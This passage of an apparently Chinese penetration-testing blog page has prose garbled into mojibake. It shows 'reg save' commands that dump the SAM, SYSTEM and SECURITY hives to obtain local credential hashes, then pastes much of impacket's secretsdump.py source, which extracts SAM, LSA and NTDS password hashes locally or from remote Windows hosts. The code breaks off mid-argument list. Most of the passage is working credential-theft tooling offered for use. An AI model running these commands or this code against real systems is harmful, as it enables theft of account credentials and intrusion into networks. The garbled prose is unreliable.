class="comment">#ä½¿ç”¨regå‘½ä»¤è·å–æœ¬åœ°ç”¨æˆ·å‡­æ®hash</span></span><br><span class="line">reg  save  hklm\sam sam.hive</span><br><span class="line">reg  save hklm\system system.hive</span><br><span class="line">reg  save hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/56.png" alt="image-20200803150511319"></p><p>ç„¶åç”¨ä¸‹é¢è¿™ä¸ªé¡¹ç›®è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;secretsdump.py</span><br></pre></td></tr></table></figure><p>é˜²æ­¢ä¸¢å¤±æˆ‘å°±æŠŠä»£ç æ‹·è´è¿‡æ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> version</span><br><span class="line"><span class="keyword">from</span> impacket.examples <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> impacket.smbconnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.examples.secretsdump <span class="keyword">import</span> LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes</span><br><span class="line"><span class="keyword">from</span> impacket.krb5.keytab <span class="keyword">import</span> Keytab</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">input</span> = raw_input</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DumpSecrets</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, remoteName, username=<span class="string">&#x27;&#x27;</span>, password=<span class="string">&#x27;&#x27;</span>, domain=<span class="string">&#x27;&#x27;</span>, options=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.__useVSSMethod = options.use_vss</span><br><span class="line">        self.__remoteName = remoteName</span><br><span class="line">        self.__remoteHost = options.target_ip</span><br><span class="line">        self.__username = username</span><br><span class="line">        self.__password = password</span><br><span class="line">        self.__domain = domain</span><br><span class="line">        self.__lmhash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__nthash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__aesKey = options.aesKey</span><br><span class="line">        self.__smbConnection = <span class="literal">None</span></span><br><span class="line">        self.__remoteOps = <span class="literal">None</span></span><br><span class="line">        self.__SAMHashes = <span class="literal">None</span></span><br><span class="line">        self.__NTDSHashes = <span class="literal">None</span></span><br><span class="line">        self.__LSASecrets = <span class="literal">None</span></span><br><span class="line">        self.__systemHive = options.system</span><br><span class="line">        self.__bootkey = options.bootkey</span><br><span class="line">        self.__securityHive = options.security</span><br><span class="line">        self.__samHive = options.sam</span><br><span class="line">        self.__ntdsFile = options.ntds</span><br><span class="line">        self.__history = options.history</span><br><span class="line">        self.__noLMHash = <span class="literal">True</span></span><br><span class="line">        self.__isRemote = <span class="literal">True</span></span><br><span class="line">        self.__outputFileName = options.outputfile</span><br><span class="line">        self.__doKerberos = options.k</span><br><span class="line">        self.__justDC = options.just_dc</span><br><span class="line">        self.__justDCNTLM = options.just_dc_ntlm</span><br><span class="line">        self.__justUser = options.just_dc_user</span><br><span class="line">        self.__pwdLastSet = options.pwd_last_set</span><br><span class="line">        self.__printUserStatus= options.user_status</span><br><span class="line">        self.__resumeFileName = options.resumefile</span><br><span class="line">        self.__canProcessSAMLSA = <span class="literal">True</span></span><br><span class="line">        self.__kdcHost = options.dc_ip</span><br><span class="line">        self.__options = options</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.hashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.__lmhash, self.__nthash = options.hashes.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)</span><br><span class="line">        <span class="keyword">if</span> self.__doKerberos:</span><br><span class="line">            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,</span><br><span class="line">                                               self.__nthash, self.__aesKey, self.__kdcHost)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> self.__username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">False</span></span><br><span class="line">                self.__useVSSMethod = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> self.__systemHive:</span><br><span class="line">                    localOperations = LocalOperations(self.__systemHive)</span><br><span class="line">                    bootKey = localOperations.getBootKey()</span><br><span class="line">                    <span class="keyword">if</span> self.__ntdsFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span></span><br><span class="line">                        self.__noLMHash = localOperations.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">import</span> binascii</span><br><span class="line">                    bootKey = binascii.unhexlify(self.__bootkey)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">True</span></span><br><span class="line">                bootKey = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        self.connect()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">if</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                            <span class="comment"># SMBConnection failed. That might be because there was no way to log into the</span></span><br><span class="line">                            <span class="comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span></span><br><span class="line">                            <span class="comment"># will work</span></span><br><span class="line">                            logging.debug(<span class="string">&#x27;SMBConnection didn\&#x27;t work, hoping Kerberos will help (%s)&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)</span><br><span class="line">                    self.__remoteOps.setExecMethod(self.__options.exec_method)</span><br><span class="line">                    <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">or</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        self.__remoteOps.enableRegistry()</span><br><span class="line">                        bootKey             = self.__remoteOps.getBootKey()</span><br><span class="line">                        <span class="comment"># Let&#x27;s check whether target system stores LM Hashes</span></span><br><span class="line">                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    self.__canProcessSAMLSA = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;STATUS_USER_SESSION_DELETED&#x27;</span>) <span class="keyword">and</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">                        <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment"># Giving some hints here when SPN target name validation is set to something different to Off</span></span><br><span class="line">                        <span class="comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span></span><br><span class="line">                        logging.error(<span class="string">&#x27;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.error(<span class="string">&#x27;RemoteOperations failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span></span><br><span class="line">            <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__canProcessSAMLSA:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SAMFileName         = self.__remoteOps.saveSAM()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SAMFileName         = self.__samHive</span><br><span class="line"></span><br><span class="line">                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)</span><br><span class="line">                    self.__SAMHashes.dump()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__SAMHashes.export(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logging.error(<span class="string">&#x27;SAM hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SECURITYFileName = self.__remoteOps.saveSECURITY()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SECURITYFileName = self.__securityHive</span><br><span class="line"></span><br><span class="line">                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,</span><br><span class="line">                                                   isRemote=self.__isRemote, history=self.__history)</span><br><span class="line">                    self.__LSASecrets.dumpCachedHashes()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportCached(self.__outputFileName)</span><br><span class="line">                    self.__LSASecrets.dumpSecrets()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportSecrets(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                        <span class="keyword">import</span> traceback</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                    logging.error(<span class="string">&#x27;LSA hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span></span><br><span class="line">            <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> self.__useVSSMethod <span class="keyword">and</span> self.__remoteOps <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    NTDSFileName = self.__remoteOps.saveNTDS()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    NTDSFileName = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                NTDSFileName = self.__ntdsFile</span><br><span class="line"></span><br><span class="line">            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,</span><br><span class="line">                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,</span><br><span class="line">                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,</span><br><span class="line">                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,</span><br><span class="line">                                           outputFileName=self.__outputFileName, justUser=self.__justUser,</span><br><span class="line">                                           printUserStatus= self.__printUserStatus)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__NTDSHashes.dump()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                    <span class="keyword">import</span> traceback</span><br><span class="line">                    traceback.print_exc()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;ERROR_DS_DRA_BAD_DN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span></span><br><span class="line">                    <span class="comment"># of enough privileges to access DRSUAPI.</span></span><br><span class="line">                    resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                    <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        os.unlink(resumeFile)</span><br><span class="line">                logging.error(e)</span><br><span class="line">                <span class="keyword">if</span> self.__justUser <span class="keyword">and</span> <span class="built_in">str</span>(e).find(<span class="string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    logging.info(<span class="string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span></span><br><span class="line">                                 <span class="string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span></span><br><span class="line">                                 <span class="string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    logging.info(<span class="string">&#x27;Something wen\&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#x27;</span>)</span><br><span class="line">            self.cleanup()</span><br><span class="line">        <span class="keyword">except</span> (Exception, KeyboardInterrupt) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            logging.error(e)</span><br><span class="line">            <span class="keyword">if</span> self.__NTDSHashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(e, KeyboardInterrupt):</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        answer =  <span class="built_in">input</span>(<span class="string">&quot;Delete resume session file? [y/N] &quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> answer.upper() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> answer == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                        resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                        <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            os.unlink(resumeFile)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.cleanup()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cleanup</span>(<span class="params">self</span>):</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Cleaning up... &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.__remoteOps:</span><br><span class="line">            self.__remoteOps.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__SAMHashes:</span><br><span class="line">            self.__SAMHashes.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__LSASecrets:</span><br><span class="line">            self.__LSASecrets.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__NTDSHashes:</span><br><span class="line">            self.__NTDSHashes.finish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process command-line arguments.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Explicitly changing the stdout encoding format</span></span><br><span class="line">    <span class="keyword">if</span> sys.stdout.encoding <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># Output is redirected to a file</span></span><br><span class="line">        sys.stdout = codecs.getwriter(<span class="string">&#x27;utf8&#x27;</span>)(sys.stdout)</span><br><span class="line"></span><br><span class="line">    print(version.BANNER)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(add_help = <span class="literal">True</span>, description = <span class="string">&quot;Performs various techniques to dump secrets from &quot;</span></span><br><span class="line">                                                      <span class="string">&quot;the remote machine without executing any agent there.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#x27;</span></span><br><span class="line">                                                       <span class="string">&#x27; (if you want to parse local files)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ts&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Adds timestamp to every logging output&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Turn DEBUG output ON&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-system&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SYSTEM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-bootkey&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;bootkey for SYSTEM hive&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-security&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SECURITY hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-sam&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SAM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ntds&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTDS.DIT file to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-resumefile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;resume file name to resume NTDS.DIT session dump (only &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;available to DRSUAPI approach). This file will also be used to keep updating the session\&#x27;s &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;state&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-outputfile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;base output filename. Extensions will be added for sam, secrets, cached and ntds&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-use-vss&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Use the VSS method insead of default DRSUAPI&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-exec-method&#x27;</span>, choices=[<span class="string">&#x27;smbexec&#x27;</span>, <span class="string">&#x27;wmiexec&#x27;</span>, 